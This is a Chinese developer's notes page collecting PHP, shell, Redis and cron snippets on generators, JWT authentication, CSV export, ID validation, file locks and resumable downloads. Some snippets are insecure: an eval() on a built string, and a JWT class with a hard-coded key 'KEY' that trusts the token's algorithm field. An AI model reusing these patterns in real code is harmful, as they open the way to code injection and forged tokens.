"*.$FT"`; do echo "conversion $file encoding $SE to $DE" iconv -f $SE -t $DE "$file" &gt; "$file".tmp mv -f "$file".tmp "$file"done该脚本已经提交到github上。https://github.com/tonydeng/note/blob/1594ae267114effa910ff2511176d3dbf7968471/sh/batch_conversion_encoding.sh调用方式➜ ~ ./batch_conversion_encoding.sh ~/sdk1 java GBK UTF8 crontab 任务误删恢复1234567891011cat /var/log/cron* | grep CMD | awk -F'CMD' '&#123;print $2&#125;' | awk -F'[(|)]' '&#123;print $2&#125;' | sort -ubackup_crontab.sh#!/usr/bin/env bash#https://liam.page/2017/11/30/recovery-crontab-tasks/BACKUP_DIRECTORY="$&#123;HOME&#125;/crontab_backup"if [ ! -e "$&#123;BACKUP_DIRECTORY&#125;" ]; then mkdir -p $&#123;BACKUP_DIRECTORY&#125;ficrontab -l &gt; $&#123;BACKUP_DIRECTORY&#125;/$(date '+%Y%m%d').txt php yield1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859function getValues() &#123; return 'value';&#125;var_dump(getValues()); // string(5) "value"function getValues() &#123; yield 'value';&#125;var_dump(getValues()); // class Generator#1 (0) &#123;&#125;一个生成器允许你使用循环来迭代一组数据，而不需要在内存中创建是一个数组，这可能会导致你超出内存限制。function getValues() &#123; // 获取内存使用数据 echo round(memory_get_usage() / 1024 / 1024, 2) . ' MB' . PHP_EOL; for ($i = 1; $i &lt; 800000; $i++) &#123; yield $i; // 做性能分析，因此可测量内存使用率 if (($i % 200000) == 0) &#123; // 内存使用以 MB 为单位 echo round(memory_get_usage() / 1024 / 1024, 2) . ' MB'. PHP_EOL; &#125; &#125;&#125;$myValues = getValues(); // 在循环之前都不会有动作foreach ($myValues as $value) &#123;&#125; // 开始生成数据https://learnku.com/laravel/t/8704/using-yield-to-do-memory-optimization-in-php function getValues() &#123; yield 'value'; return 'returnValue';&#125;$values = getValues();foreach ($values as $value) &#123;&#125;echo $values-&gt;getReturn(); // 'returnValue'function getValues() &#123; yield 'key' =&gt; 'value';&#125;$values = getValues();foreach ($values as $key =&gt; $value) &#123; echo $key . ' =&gt; ' . $value;&#125;使用 $ret = Generator::getReturn() 方法。使用 $ret = yield from Generator() 表达式function echoTimes($msg, $max) &#123; for ($i = 1; $i &lt;= $max; ++$i) &#123; echo "$msg iteration $i\n"; yield; &#125; return "$msg the end value : $i\n";&#125;function task() &#123; $end = yield from echoTimes('foo', 10); echo $end; $gen = echoTimes('bar', 5); yield from $gen; echo $gen-&gt;getReturn();&#125;foreach (task() as $item) &#123; ;&#125; Redis技巧:Sorted Set使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263127.0.0.1:6379&gt; ZADD mid_test 70 "Li Lei"(integer) 1127.0.0.1:6379&gt; ZADD mid_test 70 "Han Meimei"(integer) 1127.0.0.1:6379&gt; ZADD mid_test 99.5 "Tom"(integer) 1127.0.0.1:6379&gt; ZADD fin_test 88 "Li Lei"(integer) 1127.0.0.1:6379&gt; ZADD fin_test 75 "Han Meimei"(integer) 1127.0.0.1:6379&gt; ZADD fin_test 99.5 "Tom"(integer) 1127.0.0.1:6379&gt; ZADD fin_test 100 "Jerry"(integer) 1127.0.0.1:6379&gt; ZINTERSTORE sum_point 2 mid_test fin_test(integer) 3127.0.0.1:6379&gt; ZREVRANGE sum_point 0 -1 WITHSCORES1) "Tom"2) "199"3) "Li Lei"4) "158"5) "Han Meimei"6) "145"老师要按期中考试和期末考试的总成绩来排座位，就对mid_test和fin_test做了个交集 结果显示了学生的总成绩。 但结果中没有新来的Jerry同学（尽管TA考了100分）。这是坑一。ZINTERSTORE取所有集合的交集。以两个集合A和B为例，要取交集C，是这样的逻辑：A和B中共有的member，会加入到C中，其score等于A、B中score之和。不同时在A和B的member，不会加到C中。ZUNIONSTORE计算所有集合的并集。以两个集合A和B为例，要取并集C，是这样的逻辑：A的所有member会加到C中，其score与A中相等B的所有member会加到C中，其score与B中相等A和B中共有的member，其score等于A、B中score之和。因为ZINTERSTORE和ZUNIONSTORE有个参数为AGGREGATE，表示结果集的聚合方式，可取SUM、MIN、MAX其中之一。默认值为SUM。所以不指定聚合方式时，缺省值为SUM，即求和。http://blog.text.wiki/2015/11/01/redis-zunionstore-tip.html 127.0.0.1:6379&gt; zadd programmer 2000 peter (integer) 1 127.0.0.1:6379&gt; zadd programmer 3500 jack (integer) 1 127.0.0.1:6379&gt; zadd programmer 5000 tom (integer) 1 127.0.0.1:6379&gt; zadd manager 2000 herry (integer) 1 127.0.0.1:6379&gt; zadd manager 3500 mary (integer) 1 127.0.0.1:6379&gt; zadd manager 4000 tom (integer) 1 127.0.0.1:6379&gt; zunionstore salary 2 programmer manager (integer) 5 127.0.0.1:6379&gt; zrange salary 0 -1 withscores 1) "herry" 2) "2000" 3) "peter" 4) "2000" 5) "jack" 6) "3500" 7) "mary" 8) "3500" 9) "tom" 10) "9000" 字符串算术表达式计算123456$aa = "&#123;1&#125;*&#123;2&#125;-&#123;3&#125;"; $farr = array('/\&#123;1\&#125;/','/\&#123;2\&#125;/','/\&#123;3\&#125;/'); $tarr = array(3,4,10); $str = preg_replace( $farr,$tarr,$aa); echo $str; //结果：3*4-10 echo eval('return '.$str.';'); //结果:2 jwt 用户身份认证123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134class JwtBase &#123; //头部 private static $header=array( 'alg'=&gt;'HS256', //生成signature的算法 'typ'=&gt;'JWT' //类型 ); //使用HMAC生成信息摘要时所使用的密钥 private static $key='KEY'; /** * 获取jwt token * @param array $payload jwt载荷 格式如下非必须 * [ * 'iss'=&gt;'jwt_admin', //该JWT的签发者 * 'iat'=&gt;time(), //签发时间 * 'exp'=&gt;time()+7200, //过期时间 * 'nbf'=&gt;time()+60, //该时间之前不接收处理该Token * 'sub'=&gt;'www.admin.com', //面向的用户 * 'jti'=&gt;md5(uniqid('JWT').time()) //该Token唯一标识 * ] * @return bool|string */ public static function getToken(array $payload) &#123; $arr = [ 'iss'=&gt;'yamecent', //该JWT的签发者 'iat'=&gt;time(), //签发时间 'exp'=&gt;time()+3600*24*15, //过期时间 'nbf'=&gt;time(), //该时间之前不接收处理该Token 'sub'=&gt;'', //面向的用户 'jti'=&gt;md5(uniqid('JWT').time()) //该Token唯一标识 ]; $payload = array_merge($arr,$payload); if(is_array($payload)) &#123; $base64header=self::base64UrlEncode(json_encode(self::$header,JSON_UNESCAPED_UNICODE)); $base64payload=self::base64UrlEncode(json_encode($payload,JSON_UNESCAPED_UNICODE)); $token=$base64header.'.'.$base64payload.'.'.self::signature($base64header.'.'.$base64payload,self::$key,self::$header['alg']); return $token; &#125;else&#123; return false; &#125; &#125; /** * 验证token是否有效,默认验证exp,nbf,iat时间 * @param string $Token 需要验证的token * @return bool|string */ public static function verifyToken(string $Token) &#123; $tokens = explode('.', $Token); if (count($tokens) != 3) return false; list($base64header, $base64payload, $sign) = $tokens; //获取jwt算法 $base64decodeheader = json_decode(self::base64UrlDecode($base64header), JSON_OBJECT_AS_ARRAY); if (empty($base64decodeheader['alg'])) return false; //签名验证 if (self::signature($base64header . '.' . $base64payload, self::$key, $base64decodeheader['alg']) !== $sign) return false; $payload = json_decode(self::base64UrlDecode($base64payload), JSON_OBJECT_AS_ARRAY); //签发时间大于当前服务器时间验证失败 if (isset($payload['iat']) &amp;&amp; $payload['iat'] &gt; time()) return false; //过期时间小宇当前服务器时间验证失败 if (isset($payload['exp']) &amp;&amp; $payload['exp'] &lt; time()) return false; //该nbf时间之前不接收处理该Token if (isset($payload['nbf']) &amp;&amp; $payload['nbf'] &gt; time()) return false; return $payload; &#125; /** * base64UrlEncode https://jwt.io/ 中base64UrlEncode编码实现 * @param string $input 需要编码的字符串 * @return string */ private static function base64UrlEncode(string $input) &#123; return str_replace('=', '', strtr(base64_encode($input), '+/', '-_')); &#125; /** * base64UrlEncode https://jwt.io/ 中base64UrlEncode解码实现 * @param string $input 需要解码的字符串 * @return bool|string */ private static function base64UrlDecode(string $input) &#123; $remainder = strlen($input) % 4; if ($remainder) &#123; $addlen = 4 - $remainder; $input .= str_repeat('=', $addlen); &#125; return base64_decode(strtr($input, '-_', '+/')); &#125; /** * HMACSHA256签名 https://jwt.io/ 中HMACSHA256签名实现 * @param string $input 为base64UrlEncode(header).".".base64UrlEncode(payload) * @param string $key * @param string $alg 算法方式 * @return mixed */ private static function signature(string $input, string $key, string $alg = 'HS256') &#123; $alg_config=array( 'HS256'=&gt;'sha256' ); return self::base64UrlEncode(hash_hmac($alg_config[$alg], $input, $key,true)); &#125;&#125;$token = JwtBase::getToken(['user_id'=&gt;$user-&gt;id]);//生成token https://learnku.com/articles/21951$header = $request-&gt;header('Authorization');//验证 $token = explode(' ',$header); if(!$header || !$token)&#123; return $this-&gt;json(419,'登录信息已过期，重新登录'); &#125; $data = JwtBase::verifyToken($token[1]); if(!$data)&#123; return $this-&gt;json(419,'登录信息已过期，重新登录'); &#125; PHP 读取超大文件12345678910111213141516171819202122232425https://www.itcodemonkey.com/article/11835.html随便找一个nginx的日志文件，哪怕只有10KB，假设文件名是test.log，然后呢执行" cat test.log &gt;&gt; test.log "&lt;?php$begin = microtime( true );$fp = fopen( './test.log', 'r' );while( false !== ( $buffer = fgets( $fp, 4096 ) ) )&#123; //echo $buffer.PHP_EOL;&#125;if( !feof( $fp ) )&#123; throw new Exception('... ...');&#125;fclose( $fp );$end = microtime( true );echo "cost : ".( $end - $begin ).' sec'.PHP_EOL;&lt;?php$begin = microtime( true );$fp = fopen( './test.log', 'r' );while( !feof( $fp ) )&#123; // 如果你要使用echo，那么，你会很惨烈... fread( $fp, 10240 );&#125;fclose( $fp );$end = microtime( true );echo "cost : ".( $end - $begin ).' sec'.PHP_EOL; 下载超大数据量的Excel文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * 文章访问日志https://www.itcodemonkey.com/article/9909.html * 下载的日志文件通常很大, 所以先设置csv相关的Header头, 然后打开 * PHP output流, 渐进式的往output流中写入数据, 写到一定量后将系统缓冲冲刷到响应中 * 避免缓冲溢出 */ public function articleAccessLog($timeStart, $timeEnd) &#123; set_time_limit(0); $columns = [ '文章ID', '文章标题', ...... ]; $csvFileName = '用户日志' . $timeStart .'_'. $timeEnd . '.xlsx'; //设置好告诉浏览器要下载excel文件的headers header('Content-Description: File Transfer'); header('Content-Type: application/vnd.ms-excel'); header('Content-Disposition: attachment; filename="'. $fileName .'"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); $fp = fopen('php://output', 'a');//打开output流 mb_convert_variables('GBK', 'UTF-8', $columns); fputcsv($fp, $columns);//将数据格式化为CSV格式并写入到output流中 $accessNum = '1000000'//从数据库获取总量，假设是一百万 $perSize = 1000;//每次查询的条数 $pages = ceil($accessNum / $perSize); $lastId = 0; for($i = 1; $i &lt;= $pages; $i++) &#123; $accessLog = $logService-&gt;getArticleAccessLog($timeStart, $timeEnd, $lastId, $perSize); foreach($accessLog as $access) &#123; $rowData = [ ......//每一行的数据 ]; mb_convert_variables('GBK', 'UTF-8', $rowData); fputcsv($fp, $rowData); $lastId = $access-&gt;id; &#125; unset($accessLog);//释放变量的内存 //刷新输出缓冲到浏览器 ob_flush(); flush();//必须同时使用 ob_flush() 和flush() 函数来刷新输出缓冲。 &#125; fclose($fp); exit(); &#125; SELECT columns FROM `table_name` WHERE `created_at` &gt;= 'time range start' AND `created_at` &lt;= 'time range end' AND `id` &lt; LastId ORDER BY `id` DESC LIMIT num 判断一个图像的类型123if (exif_imagetype("image.gif") != IMAGETYPE_GIF) &#123; echo "The picture is not a gif";&#125; 给定任意数，计算是2的几次方12345678910111213141516function power($number)&#123; if ($number &lt; 0) &#123; return false; &#125; if (($number &amp; ($number - 1)) == 0) &#123; // 数学不好的,就看下面的方法https://blog.fastrun.cn/2018/07/21/1-31/ // $number = decbin($number); // return (mb_strlen($number)-1); // 数学可以的就看下面的方法 return floor(log($number,2)); &#125; else &#123; return false; &#125;&#125; CURL 发送文件123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;form action="/testFile" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt;// form 提交Route::any("/testFile","TestController@testFile");// form action 接收Route::any("/testLoadFile","TestController@testLoadFile");public function testFile(Request $request)&#123; $data = array( 'file'=&gt; new \CURLFile(realpath($request-&gt;file('file')-&gt;path())), ); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"/testLoadFile");//此处以当前服务器为接收地址 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT,10);//设置最长等待时间 curl_setopt($ch, CURLOPT_POST, 1);//post提交 curl_setopt($ch, CURLOPT_POSTFIELDS, $data); $data = curl_exec($ch);//执行 if(curl_errno($ch))&#123; return curl_error($ch); &#125; curl_close($ch);//释放 return json_encode($data); &#125; public function testLoadFile(Request $request)&#123; if ($request-&gt;hasFile('file')) &#123; if ($request-&gt;file('file')-&gt;isValid())&#123; // 上传成功 // 随机名字 . 后缀 $fileName = "other/".Date("YmdHis").substr(md5(time()),5,15).".".$request-&gt;file("file")-&gt;extension();// 需要 开启php_fileinfo 扩展 否则会报错 // 获取临时上传的路径（如果不存在本地，则方法调用完之后，会被删除） //$fileUrl = $request-&gt;file('file')-&gt;path(); // 可选存储在本地 $fileUrl = $request-&gt;file("file")-&gt;move(__DIR__."/",$fileName); return ($fileUrl); &#125; &#125; return json_encode([]); &#125; 流的方法导出 Excel12345678910111213141516171819202122232425262728293031323334353637383940414243public function export($params) &#123; set_time_limit(0); $columns = ['字段名']; $fileName = 'GPS管理明细' . '.csv'; //设置好告诉浏览器要下载excel文件的headers https://learnku.com/articles/17829 header('Content-Description: File Transfer'); header('Content-Type: application/vnd.ms-excel'); header('Content-Disposition: attachment; filename="'. $fileName .'"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); $fp = fopen('php://output', 'a');//打开output流 mb_convert_variables('GBK', 'UTF-8', $columns); fputcsv($fp, $columns); //将数据格式化为CSV格式并写入到output流中 $num = $this-&gt;getExportNum($params); $perSize = 2000;//每次查询的条数 $pages = ceil($num / $perSize); for($i = 1; $i &lt;= $pages; $i++) &#123; $list = $this-&gt;getUnitExportData($params, $i, $perSize); foreach($list as $item) &#123; $rowData[] = $this-&gt;switchDeviceMakerToDesc($item['device_maker']); . . . mb_convert_variables('GBK', 'UTF-8', $rowData); fputcsv($fp, $rowData); unset($rowData); &#125; unset($accessLog);//释放变量的内存 ob_flush(); //刷新输出缓冲到浏览器 flush(); //必须同时使用 ob_flush() 和flush() 函数来刷新输出缓冲。 &#125; fclose($fp); exit(); &#125; laravel orm12345678910111213141516171819202122232425262728293031323334353637383940取出一组热门作者及他们最近发表的3篇文章$users = \App\Models\User::with(['posts' =&gt; function ($query) &#123; $query-&gt;limit(3);&#125;])-&gt;limit(10)-&gt;get();select *from `posts`where `posts`.`user_id` in (1, 2, 3, 4, 5, 6, 7, 8, 9, 10)limit 3 $users = \App\Models\User::limit(10)-&gt;get(); $users = $users-&gt;map(function ($user) &#123; //可以考虑$user-&gt;id缓存,在保证了速度的同时避免大面积的缓存重建 $user-&gt;posts = $user-&gt;posts()-&gt;limit(3)-&gt;get(); return $user; &#125;); return $users; SELECT posts.*, @number := IF (@current_user_id = `user_id`, @number + 1, 1) AS number, @current_user_id := `user_id` FROM (select * from `posts` where `posts`.`user_id` IN (572, 822, 911, 103, 234, 11, 999, 333, 121, 122) order by `posts`.`user_id` ASC) AS posts HAVING number &lt;= 3 # User.php public function latestPosts() &#123; return $this-&gt;belongsToMany(Post::class, 'user_latest_post') &#125; 使用https://learnku.com/articles/24787#topnav $users = \App\Models\User::with(['latestPosts'])-&gt;limit(10)-&gt;get(); curl时设置Expect123456789101112在不设置 Expect 头信息使用 curl 发送 POST 请求时，如果 POST 数据大于 1kb，curl 默认行为 如下：https://www.fanhaobai.com/2017/08/curl-expect-continue.html先追加一个Expect: 100-continue请求头信息，发送这个不包含 POST 数据的请求；如果服务器返回的响应头信息中包含Expect: 100-continue，则表示 Server 愿意接受数据，这时才 POST 真正数据给 Server；// qq第三方apicurl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));// guzzle的curl Adapterif (!$request-&gt;hasHeader('Expect')) &#123; $conf[CURLOPT_HTTPHEADER][] = 'Expect:';&#125;再次 tcpdump 抓包，发现使用 curl 发送超过 1kb 的 POST 数据时，也并未出现 100-continue 的 HTTP 请求。 身份证的编码规则1234567891011121314151617181920212223242526272829303132333435363738394041const ID_15_PREG = '/^[1-9]\d&#123;7&#125;(0[1-9]|1[0-2])([0-2][1-9]|[1-2]0|31)\d&#123;3&#125;$/';//https://www.fanhaobai.com/2017/08/id-card.htmlpublic static function validate($id)&#123; if (!is_string($id) || empty($id)) &#123; return false; &#125; else if (strlen($id) == 15 &amp;&amp; preg_match(static::ID_15_PREG, $id)) &#123; return true; &#125; return false;&#125;const ID_18_PREG = '/^[1-9]\d&#123;5&#125;[1-9]\d&#123;3&#125;(0[1-9]|1[0-2])([0-2][1-9]|[1-2]0|31)(\d&#123;4&#125;|\d&#123;3&#125;[Xx])$/';public static function validate($id)&#123; if (!is_string($id) || empty($id)) &#123; return false; &#125; else if (strlen($id) == 18 &amp;&amp; preg_match(static::ID_18_PREG, $id) &amp;&amp; strtoupper($id[17]) === self::getCheckBit($id)) &#123; return true; &#125; else if (strlen($id) == 15 &amp;&amp; preg_match(static::ID_15_PREG, $id)) &#123; return true; &#125; return false;&#125;15 位身份证转化为 18 位的代码如下：public static function format18($id)&#123; if (!static::validate($id)) &#123; return ''; &#125; else if (15 !== strlen($id)) &#123; return $id; &#125; $newId = substr($id, 0, 6) . '19' . substr($id, -9) . 'X'; $newId[17] = static::getCheckBit($newId); return $newId;&#125;转化示例结果：//15位---------------------18位'370725881105149' =&gt; '37072519881105149X' 定时脚本1234567891011121314151617181920212223242526272829303132在不增加脚本文件可执行权限的情况，可以直接使用sh命令解决。https://www.fanhaobai.com/2017/07/php-cli-setting.html# 直接执行$ sh ./crontab.sh# crontab$ crontab -e10 0 * * * sh /mnt/hgfs/Code/ziroom/crontab/cli/crontab.sh &gt; /home/log/cli.log单实例防并发脚本往往只需要单实例执行，甚至有时候启动多个实例并行执行会带来不可预期的错误。例如，一个脚本执行时间偶尔会超过 10 分钟，而我又需要以每 5 分钟的频率执行，那么不可避免的会出现多实例并发执行的异常情况，这时可以使用 文件锁 来保证脚本的单实例执行。当然，我们可以在脚本中实现文件锁，但是我们往往希望脚本只涉及到业务逻辑，这样方便维护。此时可以使用flock命令来解决：# flock文件锁5 * * * * /usr/bin/flock -xn /var/run/crontab.lock -c "/mnt/hgfs/Code/ziroom/crontab/cli/crontab.sh &gt; /home/log/cli.log"使用 flock 命令，一个明显的好处是不对业务有任何侵入，脚本只需关注业务逻辑。错误调试调试脚本时，遇到一些系统层面的错误问题，一般都不易发现，这时使用strace可以用来查看系统调用的执行，才是解决问题的根本。$ strace crontab.shexecve("./crontab.sh", ["./crontab.sh"], [/* 29 vars */]) = 0brk(0) = 0x106a000mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0434160000access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)open("/etc/ld.so.cache", O_RDONLY) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=53434, ...&#125;) = 0mmap(NULL, 53434, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f0434152000close(3) = 0open("/lib64/libc.so.6", O_RDONLY) = 3 PHP文件锁机制123456789101112//获取指针$file = 'lock/increase.txt';$fp = fopen($file, 'r');//加排他锁flock($fp, LOCK_EX);//数据操作$key = 'company_watch_num_' . $request['company_id'];Cache::increment($key);//解锁flock($fp, LOCK_UN);//关闭指针fclose($fp); 关闭错误日志12345，通过 error_log off 并不能关闭错误日志记录，而它只是表示将日志文件写入一个文件名为 off 的文件中。如果需要关闭错误日志记录，应使用以下配置：error_log /dev/null crit; # 把存储位置设置为linux的黑洞 php实现多进程1234567891011121314151617181920212223242526272829producer.php&lt;?phpecho microtime(true).'&lt;br&gt;';$url = 'http://localhost/consumer.php';$curl = curl_init();curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_HEADER, 1);curl_setopt($curl, CURLOPT_NOSIGNAL, 1);curl_setopt($curl, CURLOPT_TIMEOUT_MS, 200); //超时等待时间为200mscurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);$data = curl_exec($curl);curl_close($curl);echo microtime(true);consumer.php&lt;?phpignore_user_abort(true); //客户端断开链接后，php脚本继续运行. 这行代码可能有点多余，但是无法准确的证明，所以先留着set_time_limit(0); //保证程序长时间运行不中断 http://eienao.com/posts/use-php-to-achieve-a-multi-process-ideas.htmlwhile(true) &#123; file_put_contents('./date', time()); sleep(2);&#125; 反射机制实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?phphttp://eienao.com/posts/a-brief-introduction-to-the-realization-of-container-reflection-mechanism.htmlnamespace Container;class Container&#123; public static function make($class) &#123; $reflection = new \ReflectionClass($class); $constructor = $reflection-&gt;getConstructor(); $parameters = $constructor-&gt;getParameters(); $instances = []; foreach ($parameters as $parameter) &#123; $className = $parameter-&gt;getClass()-&gt;getName(); $instances[] = new $className; &#125; //... 将数组拆封成参数传递给方法, 类似于 call_user_func_array() return new $class(...$instances); &#125;&#125;&lt;?phpnamespace Container\Foo;use Container\Bar\BarA;use Container\Bar\BarB;use Container\Bar\BarC;use Container\Bar\BarD;class Foo&#123; private $barA; private $barB; private $barC; private $barD; public function __construct(BarA $barA, BarB $barB, BarC $barC, BarD $barD) &#123; $this-&gt;barA = $barA; $this-&gt;barB = $barB; $this-&gt;barC = $barC; $this-&gt;barD = $barD; &#125; public function allBarName() &#123; return $this-&gt;barA-&gt;name().'/'.$this-&gt;barB-&gt;name().'/'.$this-&gt;barC-&gt;name().'/'.$this-&gt;barD-&gt;name(); &#125;&#125;&lt;?phpnamespace Container\Bar;class BarA&#123; public function name() &#123; return '彼得·帕克'; &#125;&#125;$foo = \Container\Container::make(\Container\Foo\Foo::class);echo $foo-&gt;allBarName(); // 彼得·帕克/托尼·屎大颗/巴里·艾伦/布鲁斯·韦恩 https://github.com/weiwenhao/container$foo = new \Container\Foo\Foo( new \Container\Bar\BarA(), new \Container\Bar\BarB(), new \Container\Bar\BarC(), new \Container\Bar\BarD());echo $foo-&gt;allBarName(); cron1234567891011121314151617181920设定每个脚本最多执行时间位 200秒，超过 200秒 就自动死掉。https://learnku.com/articles/25177* * * * * timeout 200 php /home/app/email.php如果这个脚本执行时间超过 60秒，下一分钟又会执行 php email.php，如果避免重复执行？* * * * * flock -xn /tmp/test.lock -c "timeout 200 php /home/app/email.php"想 10s 执行一次怎么办？* * * * * php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1* * * * * ( sleep 10 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 20 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 30 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 40 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 50 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )ccat test.php$i = 10000;while ($i &gt; 0) &#123; echo --$i . \PHP_EOL; sleep(1);&#125; 分割数组123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//源数据$origin =[];//当前本地数据$current=[];//生成10000个数据for($i=1;$i&lt;10000;$i++) &#123; $origin[] = ['id' =&gt; $i, 'title' =&gt; 'title'.$i, 'content' =&gt; 'name'.$i];&#125;//假设本地的数据已经取好了，我用title来作为唯一值来处理吧，容易认一点for($i=5000;$i&lt;8000;$i++) &#123; $current[] = 'title'.$i;&#125;$t1 = microtime(true);$insertArr = [];$updateArr = [];foreach ($origin as $k=&gt;$value) &#123; if (!in_array($value['title'], $current)) &#123; $insertArr[] = $value; &#125;else &#123; $updateArr[] = $value; &#125;&#125;$t2 = microtime(true);dd($t2 - $t1);$t1 = microtime(true);array_walk($origin, function($value) use ($current, &amp;$insertArr, &amp;$updateArr) &#123; if (!in_array($value['title'], $current)) &#123; $insertArr[] = $value; &#125; else &#123; $updateArr[] = $value; &#125;&#125;);或者array_map(function($value) use ($current, &amp;$insertArr, &amp;$updateArr) &#123; if (!in_array($value['title'], $current)) &#123; $insertArr[] = $value; &#125; else &#123; $updateArr[] = $value; &#125;&#125;, $origin);$t2 = microtime(true);dd($t2 - $t1);/** * 对比法分割数组https://learnku.com/articles/25250 * * @param $key 通过指定键（key）去对比 * @param $origin 原数组 * @param $split 分割数组 （源数组中的某个键的值） * @return array ['split'=&gt;被分割出来的数组, 'remainders'=&gt;剩余的数据]; */function splitArr($key, $origin, $split)&#123; //把title取出来做为键 $origin_new = array_combine(array_column($origin, $key), $origin); //把值作为键 $split_flip = array_flip($split); //剩余的源数据 （用键来做差集比较得剩余的源数据） $remainders = array_diff_key($origin_new, $split_flip); //被分割出来的数据 $new_split = array_diff_key($origin_new, $remainders); return ['split'=&gt;$new_split, 'remainders'=&gt;$remainders];&#125; json_encode()如何转化一个对象123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//https://blog.yiranzai.cn/posts/26855/class JsonTest implements JsonSerializable&#123; public const TEST = 'c'; public $a = 'a'; public static $b = 'b'; protected $e = 'e'; private $d = 'd'; protected function test1() &#123; return __FUNCTION__; &#125; private function test2() &#123; return __FUNCTION__; &#125; public function test3() &#123; return __FUNCTION__; &#125; public static function test4() &#123; return __FUNCTION__; &#125; public function jsonSerialize() &#123; $json = array(); foreach ($this as $key =&gt; $value) &#123; $json[$key] = $value; &#125; return $json; &#125;&#125;echo json_encode(new JsonTest());//&#123; "a": "a", "e": "e", "d": "d" &#125;&gt;&gt;&gt; $a = [1,2,3,4]; &gt;&gt;&gt; json_encode($a);=&gt; "[1,2,3,4]"&gt;&gt;&gt; json_encode((object)$a);=&gt; "&#123;"0":1,"1":2,"2":3,"3":4&#125;"&gt;&gt;&gt; json_encode($a,JSON_FORCE_OBJECT);=&gt; "&#123;"0":1,"1":2,"2":3,"3":4&#125;"&gt;&gt;&gt; json_encode($a,JSON_FORCE_OBJECT|JSON_PRETTY_PRINT);=&gt; """ &#123;\n "0": 1,\n "1": 2,\n "2": 3,\n "3": 4\n &#125; """ 断点续传123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899class FileDownload&#123; // class start private $_speed = 512; // 下载速度 /** 下载 * @param String $file 要下载的文件路径 * @param String $name 文件名称,为空则与下载的文件名称一样 * @param boolean $reload 是否开启断点续传 */ public function download($file, $name='', $reload=false)&#123; if(file_exists($file))&#123; if($name=='')&#123; $name = basename($file); &#125; $fp = fopen($file, 'rb'); $file_size = filesize($file); $ranges = $this-&gt;getRange($file_size); header('cache-control:public'); header('content-type:application/octet-stream'); header('content-disposition:attachment; filename='.$name); if($reload &amp;&amp; $ranges!=null)&#123; // 使用续传 header('HTTP/1.1 206 Partial Content'); header('Accept-Ranges:bytes'); // 剩余长度 header(sprintf('content-length:%u',$ranges['end']-$ranges['start'])); // range信息 header(sprintf('content-range:bytes %s-%s/%s', $ranges['start'], $ranges['end'], $file_size)); // fp指针跳到断点位置 fseek($fp, sprintf('%u', $ranges['start'])); &#125;else&#123; header('HTTP/1.1 200 OK'); header('content-length:'.$file_size); &#125; while(!feof($fp))&#123; echo fread($fp, round($this-&gt;_speed*1024,0)); ob_flush(); sleep(1); // 用于测试,减慢下载速度 &#125; ($fp!=null) &amp;&amp; fclose($fp); &#125;else&#123; return ''; &#125; &#125; /** 设置下载速度 * @param int $speed */ public function setSpeed($speed)&#123; if(is_numeric($speed) &amp;&amp; $speed&gt;16 &amp;&amp; $speed&lt;4096)&#123; $this-&gt;_speed = $speed; &#125; &#125; /** 获取header range信息 * @param int $file_size 文件大小 * @return Array */ private function getRange($file_size)&#123; if(isset($_SERVER['HTTP_RANGE']) &amp;&amp; !empty($_SERVER['HTTP_RANGE']))&#123; $range = $_SERVER['HTTP_RANGE']; $range = preg_replace('/[\s|,].*/', '', $range); $range = explode('-', substr($range, 6)); if(count($range)&lt;2)&#123; $range[1] = $file_size; &#125; $range = array_combine(array('start','end'), $range); if(empty($range['start']))&#123; $range['start'] = 0; &#125; if(empty($range['end']))&#123; $range['end'] = $file_size; &#125; return $range; &#125; return null; &#125;&#125;$file = 'book.zip'; $name = time().'.zip'; $obj = new FileDownload(); $flag = $obj-&gt;download($file, $name); //$flag = $obj-&gt;download($file, $name, true); // 断点续传 if(!$flag)&#123; echo 'file not exists';&#125; 字节处理函数pack unpack1234567891011121314151617181920212223242526272829303132将数据打包成二进制字符串https://learnku.com/articles/25414#topnavvar_dump(pack('C', 80))//Pvar_dump(pack('C*', 80, 72, 80)) //PHPvar_dump(unpack('C', 'P'))//[1=&gt;80]var_dump(unpack('C*', 'PHP')) //unpack('H*hello/C*world', 'PHP')[ "hello" =&gt; "504850", "world1" =&gt; 80, "world2" =&gt; 72, "world3" =&gt; 80,]unpack('H*/C*', 'PHP')[ 1 =&gt; 80, 2 =&gt; 72, 3 =&gt; 80,]$pack = unpack('C*', '\x00\x10')$tmp = array_map(function ($val) &#123; 